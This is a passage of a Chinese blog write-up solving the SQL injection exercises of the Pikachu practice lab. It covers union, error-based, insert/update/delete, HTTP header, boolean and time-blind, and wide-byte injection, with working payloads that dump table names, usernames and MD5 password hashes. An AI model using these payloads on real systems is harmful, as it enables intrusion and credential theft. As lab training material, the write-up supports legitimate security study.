+<p>中间内容和字符型注入(get)类似，只是多加一个)进行闭合，在此不再赘述</p>
+<p>直接查询字段username和password的内容</p>
+<p>‘) union select group_concat(username),group_concat(password) from users – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776675119.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="6-insert-amp-update注入"><a href="#6-insert-amp-update注入" class="headerlink" title="6.insert&amp;update注入"></a>6.insert&amp;update注入</h2><p>insert&#x2F;update是插入和更新的意思，这两个场景的注入，post数据包里的每一个参数都可以注入</p>
+<h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>首先在注册的时候抓包分析。</p>
+<p>username&#x3D;’ 报错，可判断存在SQL注入</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776690016.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>本题运用报错注入的方法进行解答</p>
+<p>查询用户名root@localhost</p>
+<p>username&#x3D;’ or updatexml(1,concat(0x7e,(select user())),1),1) – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776699714.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询数据库名pikachu</p>
+<p>username&#x3D;’ or updatexml(1,concat(0x7e,(select database())),1),1) – q</p>
+<p>其他payload：</p>
+<p>如果用– q闭合的话，需要多加,1) 如果用or’闭合的话则不需要</p>
+<p>可以是concat(0x7e,(select database())) 也可以是concat(0x7e,(select database()),0x7e)</p>
+<p>username&#x3D;’ or updatexml(1,concat(0x7e,(select database())),1)or’</p>
+<p>username&#x3D;’ or updatexml(‘<del>‘,concat(0x7e,(select database())),’</del>‘)or’</p>
+<p>username&#x3D;’ or updatexml(‘<del>‘,concat(0x7e,(select database())),’</del>‘),1)– q</p>
+<p>username&#x3D;’ or updatexml(‘<del>‘,concat(0x7e,(select database()),0x7e),’</del>‘)or’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776710300.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>updatexml函数可以替换为extractvalue函数，并且updatexml(1,concat(x),1)中后面的1或者<del>不能去掉，而extractvalue(1,concat(x))中没有后面的1或者</del></p>
+<p>如果用– q闭合的话，需要多加,1) 如果用or’闭合的话则不需要，注意分情况讨论，具体情况具体分析，多试一试就完事</p>
+<p>username&#x3D;’ and extractvalue(1,concat(0x7e,(select database())))and’</p>
+<p>username&#x3D;’ and extractvalue(1,concat(0x7e,(select database())),1)and’</p>
+<p>username&#x3D;’ and extractvalue(‘~’,concat(0x7e,(select database())))and’</p>
+<p>username&#x3D;’ and extractvalue(1,concat(0x7e,(select database()))),1)– q</p>
+<p>username&#x3D;’ and extractvalue(‘~’,concat(0x7e,(select database()))),1)– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776730490.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,x发现不能全部显示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;)),1)or&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776756951.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>在这一步可以使用left，mid，right来进行分段显示，将得到的信息进行拼接，下图中的22是从右往左显示22个字符，所有表名httpinfo,member,message,users,xssblind</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;pikachu&#x27;),22)),1)or&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776771209.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>还可以用limit函数逐个读取数据库中的表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;pikachu&#x27; limit 0,1)),1)or&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776787251.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询users表中的字段名id,username,password,level,id,u</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)),1)or&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776800362.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询users表中所有的字段名id,username,password,level,id,username,password</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,right((select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),22)),1)or&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776815219.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>还可以用limit函数逐个读取users表中的字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&#x27; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),1)or&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776830214.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>直接查询字段username的内容admin,pikachu,test</p>
+<p>username&#x3D;’ or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)or’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776841358.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>直接查询字段passowrd的内容,因为字符数量比较多，所以直接用limit函数读取</p>
+<p>username&#x3D;’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776848730.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>首先利用已知的账号kobe，密码123456登录</p>
+<p>点击修改个人信息，点击submit，抓包</p>
+<p>sex&#x3D;’ 报错，可判断存在SQL注入</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776880909.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>中间过程和insert注入类似，只是注入参数变成了sex</p>
+<p>直接查询字段username的内容admin,pikachu,test</p>
+<p>sex&#x3D;’ or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)or’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776891044.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>直接查询字段passowrd的内容,因为字符数量比较多，所以直接用limit函数读取</p>
+<p>sex&#x3D;’ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776904572.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="7-delete注入"><a href="#7-delete注入" class="headerlink" title="7.delete注入"></a>7.delete注入</h2><p>查看源码，没有对GET参数获取到的id进行任何处理，直接拼接，进行删除</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776918570.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>输入1，点击submit，再点击删除，抓包</p>
+<p>修改id&#x3D;58’,报错，可判断存在SQL注入</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776942656.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以直接在url进行操作，查询数据库名pikachu</p>
+<p>&#x2F;vul&#x2F;sqli&#x2F;sqli_del.php?id&#x3D;59%20or%20updatexml(1,concat(0x7e,(select%20database())),1)</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776947461.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>中间内容和insert&amp;updatexml内容类似，只是不需要闭合单引号，在此不做过多赘述</p>
+<p>直接查询字段username的内容admin,pikachu,test</p>
+<p> %20or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776955984.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>直接查询字段passowrd的内容,因为字符数量比较多，所以直接用limit函数读取</p>
+<p> %20or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776965613.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="8-http-header注入"><a href="#8-http-header注入" class="headerlink" title="8.http header注入"></a>8.http header注入</h2><p>输入admin&#x2F;123456，点击login登录</p>
+<p>通常情况下，页面返回信息有user agent数据的，将http头中的user-agent和accept带入了SQL查询，如果没过滤就会存在http header注入 </p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776984371.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>刷新页面抓包，Accept也可进行注入</p>
+<p>修改User-Agent: ‘ 报错，可以判断此处存在SQL注入</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671776993830.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>查询数据库名</p>
+<p>‘ or updatexml(1,concat(0x7e,(select database())),1)or’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777002626.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>中间过程和insert&#x2F;update注入一样，只是注入参数修改为User-Agent,在此不再赘述</p>
+<p>直接查询字段username的内容admin,pikachu,test</p>
+<p>‘ or updatexml(1,concat(0x7e,(select group_concat(username) from users)),1)or’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777009804.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>直接查询字段passowrd的内容,因为字符数量比较多，所以直接用limit函数读取</p>
+<p>‘ or updatexml(1,concat(0x7e,(select password from users limit 0,1)),1)or’</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777020269.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="9-盲注-base-on-boolian"><a href="#9-盲注-base-on-boolian" class="headerlink" title="9.盲注(base on boolian)"></a>9.盲注(base on boolian)</h2><p>由题可知是布尔盲注，只会返回True或者False，不会返回报错信息</p>
+<p>输入lucy，点击查询,返回True，输入lucy’返回False，说明此处存在SQL注入</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777036647.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断当前数据库的长度，大于6不大于7，所以长度为7，可以用burp的intruder</p>
+<p>lucy’ and length(database())&gt;7– q，False</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777042794.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>lucy’ and length(database())&gt;6– q，True</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777053139.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断库名第一个字母为p，True</p>
+<p>lucy’ and (substr(database(),1,1))&#x3D;’p’– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777061961.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以此类推，数据库名为pikachu</p>
+<p>判断表名第一个表的第一个字母为h，True</p>
+<p>lucy’ and (substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;’h’– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777068582.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以此类推，所有表名为httpinfo,member,message,users,xssblind</p>
+<p>判断users表中第一个字段的第一个字母是i，True</p>
+<p>lucy’ and (substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),1,1))&#x3D;’i’– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777079777.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以此类推，所有字段名为id,username,password,level,id,username,password</p>
+<p>判断username中第一个内容的第一个字母为a，True</p>
+<p>lucy’ and (substr((select username from users limit 0,1),1,1))&#x3D;’a’– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777086705.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以此类推</p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="10-盲注-base-on-time"><a href="#10-盲注-base-on-time" class="headerlink" title="10.盲注(base on time)"></a>10.盲注(base on time)</h2><p>由题可知是延时注入</p>
+<p>使用sleep()函数：输入</p>
+<p>kobe%27+and+sleep%283%29–%20q</p>
+<p>页面延时3秒返回，说明此处存在延时注入漏洞</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777106196.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断当前数据库名长度为7，页面没有延时，说明数据库长度为7</p>
+<p>kobe%27+and sleep(if((length(database())&#x3D;7),0,3))–%20q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777111609.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>判断库名第一个字母为p，页面没有延时，说明数据库第一个字母为p</p>
+<p>kobe’ and if(substr(database(),1,1)&#x3D;’p’,0,sleep(3))– q</p>
+<p>kobe’ and if(ascii(substr(database(),1,1))&#x3D;ascii(‘p’),0,sleep(3))– q</p>
+<p>kobe’ and sleep(if(ascii(substr(database(),1,1))&#x3D;ascii(‘p’),0,3))– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777117741.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以此类推，数据库名为pikachu</p>
+<p>判断表名第一个表的第一个字母为h，页面没有延时，说明第一个表的第一个字母为h</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;h&#x27;,0,sleep(3))-- q</span><br><span class="line"></span><br><span class="line">kobe&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=ascii(&#x27;h&#x27;),0,sleep(3))-- q</span><br><span class="line"></span><br><span class="line">kobe&#x27; and sleep(if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=&#x27;h&#x27;,0,3))-- q</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777128139.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以此类推，所有表名为httpinfo,member,message,users,xssblind</p>
+<p>判断users表中第一个字段的第一个字母是i，页面没有延时，users表中第一个字段的第一个字母是i</p>
+<p>kobe’ and if(substr((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),1,1)&#x3D;’i’,0,sleep(3))– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777144459.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以此类推，所有字段名为id,username,password,level,id,username,password</p>
+<p>判断username中第一个内容的第一个字母为a，页面没有延时，username中第一个内容的第一个字母为a</p>
+<p>kobe’ and if(substr((select username from users limit 0,1),1,1)&#x3D;’a’,0,sleep(3))– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777152925.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>以此类推</p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h2 id="11-宽字节注入"><a href="#11-宽字节注入" class="headerlink" title="11.宽字节注入"></a>11.宽字节注入</h2><p>由题可知是宽字节注入，简单来说就是数据库用了GBK编码，\转义了’ ,\的GBK编码是%5c,而%df%5c是一个繁体字“連”，可以输入%df吃掉%5c,此时单引号逃逸就可以发挥作用了</p>
+<p>输入kobe%df’ or 1&#x3D;1– q，点击查询，抓包，可以查询出所有用户的数据</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777171479.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>pikachu的宽字节靶场无法判断字段数，根据之前的经验，直接进入下一步</p>
+<p>判断回显点可以在1和2这两处位置，获得我们想要的信息</p>
+<p>kobe%df’ union select 1,2– q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777179533.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>中间的过程和字符型(get）注入类似，只是需要%df来逃逸单引号，在此不再赘述</p>
+<p>直接查询字段username和password的内容</p>
+<p>kobe%df’ union select group_concat(username),group_concat(password) from users – q</p>
+<p><img src="/2018/09/11/Pikachu%E9%9D%B6%E5%9C%BA-SQL-Inject/clipboard-1671777187267.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Pikachu靶场-SQL-Inject</div>
+      <div>http://rdyx0.github.io/2018/09/11/Pikachu靶场-SQL-Inject/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>儒道易行</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2018年9月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2018/09/12/Pikachu%E9%9D%B6%E5%9C%BA-RCE/" title="Pikachu靶场-RCE">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Pikachu靶场-RCE</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2018/09/10/Pikachu%E9%9D%B6%E5%9C%BA-CSRF/" title="Pikachu靶场-CSRF">
+                        <span class="hidden-mobile">Pikachu靶场-CSRF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/rdyx0" target="_blank" rel="nofollow noopener"><span>儒道易行</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
